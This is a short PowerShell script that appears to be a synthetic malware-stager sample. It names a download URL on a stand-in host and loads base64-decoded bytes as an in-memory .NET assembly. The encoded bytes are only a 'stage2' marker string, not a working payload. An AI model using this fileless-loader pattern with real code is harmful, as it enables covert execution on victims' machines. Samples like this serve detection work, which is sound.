
$DownloadUrl = "http://adatum.com:80/payload.bin"
$ErrorActionPreference = "Stop"

try {
    $AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjppNTdveTlqcG91')
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $StageResult = [Reflection.Assembly]::Load($AssemblyBytes)
    if ($null -ne $StageResult) {
        Write-Verbose ("Loaded assembly: " + $StageResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

$StageMarker = "stage-16"
Write-Output "stage 20 initialized"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
